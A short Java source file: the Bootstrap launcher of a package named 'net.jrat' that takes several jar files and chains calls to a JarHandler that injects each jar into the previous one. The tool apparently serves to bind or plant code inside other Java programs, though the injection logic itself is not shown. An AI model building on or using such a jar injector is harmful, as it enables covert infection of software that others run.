package net.jrat;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import net.jrat.inject.JarHandler;

public class Bootstrap
{
	public static void main(String[] paths)
	{
		try
		{
			final List<File> files = new ArrayList<File>();
			
			for(String path : paths)
			{
				if(!(path.endsWith(".jar")))
					throw new Exception(path + " is not a jar file");
				
				final File file = new File(path);
				if(!(file.exists()))
					throw new Exception("file " + file.getAbsolutePath() + " not found");
				
				files.add(file);
			}
			
			if(files.size() > 0)
			{
				for(int i = (files.size() - 1); i > 0; i --)
				{
					final File current = files.get(i);
					
					try
					{
						final File next = files.get(i == 0 ? 0 : (i - 1));
						
						if(current == next)
							break;
						
						new JarHandler().applyInjection(current, next);
					}
					catch (Exception e)
					{
						System.err.println("could not inject file " + current.getAbsolutePath() + ": " + e.getMessage());
					}
				}
			}
		}
		catch(Exception e)
		{
			System.err.println("error: " + e.getMessage());
		}
	}
}